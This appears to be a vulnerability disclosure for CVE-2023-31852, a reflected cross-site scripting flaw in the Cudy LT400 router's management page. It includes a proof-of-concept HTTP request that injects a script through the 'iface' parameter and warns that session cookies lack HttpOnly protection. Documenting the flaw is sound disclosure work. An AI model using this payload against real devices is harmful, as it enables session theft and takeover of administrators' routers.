# CVE-2023-31852

Reflected cross-site scripting (XSS) attack exists in web-based management interface of Cudy LT400.

The page `/cgi-bin/luci/admin/network/wireless/config` has reflected XSS via the `iface` parameter.

The methods of exploitation would involve sending a specially crafted request to the victim that includes malicious code.

**The affected application does not set the Session Cookie with the HttpOnly attribute; this can result in admin takeover via session token theft.**

## PoC

```
GET /cgi-bin/luci/admin/network/wireless/config?nomodal=&iface=wlan00%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3e HTTP/1.1
Host: 172.16.1.1
User-Agent: Mozilla/5.0
Accept: text/html, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://172.16.1.1/cgi-bin/luci/admin/setup
Cookie: sysauth=REDACTED
```

## Vendor

Shenzhen Cudy Technology

## CVE Reference

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-31852

## Product Reference

https://www.cudy.com
